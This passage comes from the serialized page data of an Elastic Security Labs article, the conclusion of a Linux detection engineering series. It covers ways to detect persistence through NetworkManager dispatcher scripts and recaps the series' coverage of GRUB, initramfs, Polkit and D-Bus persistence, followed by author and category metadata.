Scripts\"}),\": Tracks changes within the \",(0,i.jsx)(e.code,{children:\"/etc/NetworkManager/dispatcher.d/\"}),\" directory. Monitoring for new or altered scripts helps detect unauthorized additions or modifications that could indicate malicious intent.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Detection of Suspicious Processes\"}),\": Monitors processes executed by \",(0,i.jsx)(e.code,{children:\"nm-dispatcher\"}),\" or scripts located in \",(0,i.jsx)(e.code,{children:\"/etc/NetworkManager/dispatcher.d/\"}),\". By analyzing command lines, parent processes, and execution counts, unusual or unauthorized script executions can be identified.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Metadata Analysis of Dispatcher Scripts\"}),\": Inspects ownership, last access times, and modification timestamps for files in \",(0,i.jsx)(e.code,{children:\"/etc/NetworkManager/dispatcher.d/\"}),\". This can reveal unauthorized changes or anomalies in file attributes that may indicate persistence attempts.\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"By combining the \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_network_manager_dispatcher_script.toml\",rel:\"nofollow\",children:\"Persistence via NetworkManager Dispatcher Script\"}),\" hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1546/\",rel:\"nofollow\",children:\"T1546\"}),\".\"]}),`\n`,(0,i.jsx)(e.h1,{id:\"conclusion\",children:\"Conclusion\"}),`\n`,(0,i.jsx)(e.p,{children:'In the fifth and concluding chapter of the \"Linux Detection Engineering\" series, we turned our attention to persistence mechanisms rooted in the Linux boot process, authentication systems, inter-process communication, and core utilities. We began with GRUB-based persistence and the manipulation of initramfs, covering both manual approaches and automated methods using Dracut. Moving further, we explored Polkit-based persistence, followed by a dive into D-Bus exploitation, and concluded with NetworkManager dispatcher scripts, highlighting their potential for abuse in persistence scenarios.'}),`\n`,(0,i.jsxs)(e.p,{children:[\"Throughout this series, \",(0,i.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX\",rel:\"nofollow\",children:\"PANIX\"}),\" played a critical role in demonstrating and simulating these techniques, allowing you to test your detection capabilities and strengthen your defenses. Combined with the tailored ES|QL and OSQuery queries provided, these tools enable you to identify and respond effectively to even the most advanced persistence mechanisms.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"As we close this series, we hope you feel empowered to tackle Linux persistence threats with confidence. Armed with practical knowledge, actionable strategies, and hands-on experience, you are well-prepared to defend against adversaries targeting Linux environments. Thank you for joining us, and as always, stay vigilant and happy hunting!\"})]})}function k(n={}){let{wrapper:e}=n.components||{};return e?(0,i.jsx)(e,Object.assign({},n,{children:(0,i.jsx)(d,n)})):d(n)}var x=k;return w(_);})();\n;return Component;"},"_id":"articles/the-grand-finale-on-linux-persistence.mdx","_raw":{"sourceFilePath":"articles/the-grand-finale-on-linux-persistence.mdx","sourceFileName":"the-grand-finale-on-linux-persistence.mdx","sourceFileDir":"articles","contentType":"mdx","flattenedPath":"articles/the-grand-finale-on-linux-persistence"},"type":"Article","imageUrl":"/assets/images/the-grand-finale-on-linux-persistence/Security Labs Images 5.jpg","readingTime":"48 min read","series":"","url":"/the-grand-finale-on-linux-persistence","headings":[],"author":[{"title":"Ruben Groenewoud","slug":"ruben-groenewoud","description":"Security Research Engineer, Elastic","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var s=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var g=Object.getOwnPropertyNames;var f=Object.getPrototypeOf,l=Object.prototype.hasOwnProperty;var _=(e,t)=\u003e()=\u003e(t||e((t={exports:{}}).exports,t),t.exports),j=(e,t)=\u003e{for(var n in t)s(e,n,{get:t[n],enumerable:!0})},a=(e,t,n,u)=\u003e{if(t\u0026\u0026typeof t==\"object\"||typeof t==\"function\")for(let o of g(t))!l.call(e,o)\u0026\u0026o!==n\u0026\u0026s(e,o,{get:()=\u003et[o],enumerable:!(u=d(t,o))||u.enumerable});return e};var p=(e,t,n)=\u003e(n=e!=null?x(f(e)):{},a(t||!e||!e.__esModule?s(n,\"default\",{value:e,enumerable:!0}):n,e)),b=e=\u003ea(s({},\"__esModule\",{value:!0}),e);var i=_((D,c)=\u003e{c.exports=_jsx_runtime});var y={};j(y,{default:()=\u003eh,frontmatter:()=\u003ew});var r=p(i()),w={title:\"Ruben Groenewoud\",description:\"Security Research Engineer, Elastic\",slug:\"ruben-groenewoud\"};function m(e){return(0,r.jsx)(r.Fragment,{})}function M(e={}){let{wrapper:t}=e.components||{};return t?(0,r.jsx)(t,Object.assign({},e,{children:(0,r.jsx)(m,e)})):m(e)}var h=M;return b(y);})();\n;return Component;"},"_id":"authors/ruben-groenewoud.mdx","_raw":{"sourceFilePath":"authors/ruben-groenewoud.mdx","sourceFileName":"ruben-groenewoud.mdx","sourceFileDir":"authors","contentType":"mdx","flattenedPath":"authors/ruben-groenewoud"},"type":"Author","imageUrl":"","url":"/authors/ruben-groenewoud"}],"category":[{"title":"Security research","slug":"security-research","body":{"raw":"","code":"var Component=(()=\u003e{var x=Object.create;var s=Object.defineProperty;var f=Object.getOwnPropertyDescriptor;var _=Object.getOwnPropertyNames;var g=Object.getPrototypeOf,j=Object.prototype.hasOwnProperty;var l=(t,e)=\u003e()=\u003e(e||t((e={exports:{}}).exports,e),e.exports),d=(t,e)=\u003e{for(var r in e)s(t,r,{get:e[r],enumerable:!0})},c=(t,e,r,a)=\u003e{if(e\u0026\u0026typeof e==\"object\"||typeof e==\"function\")for(let o of _(e))!j.call(t,o)\u0026\u0026o!==r\u0026\u0026s(t,o,{get:()=\u003ee[o],enumerable:!(a=f(e,o))||a.enumerable});return t};var h=(t,e,r)=\u003e(r=t!=null?x(g(t)):{},c(e||!t||!t.__esModule?s(r,\"default\",{value:t,enumerable:!0}):r,t)),p=t=\u003ec(s({},\"__esModule\",{value:!0}),t);var i=l((X,u)=\u003e{u.exports=_jsx_runtime});var D={};d(D,{default:()=\u003eC,frontmatter:()=\u003ey});var n=h(i()),y={title:\"Security research\",slug:\"security-research\"};function m(t){return(0,n.jsx)(n.Fragment,{})}function M(t={}){let{wrapper:e}=t.components||{};return e?(0,n.jsx)(e,Object.assign({},t,{children:(0,n.jsx)(m,t)})):m(t)}var C=M;return p(D);})();\n;return Component;"},"_id":"categories/security-research.mdx","_raw":{"sourceFilePath":"categories/security-research.mdx","sourceFileName":"security-research.mdx","sourceFileDir":"categories","contentType":"mdx","flattenedPath":"categories/security-research"},"type":"Category","url":"/categories/security-research"}]},"seriesArticles":null},"__N_SSG":true},"page":"/[slug]","query":{"slug":"the-grand-finale-on-linux-persistence"},"buildId":"0ofDG0sK6QXje0tAbhpGf","assetPrefix":"/security-labs","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>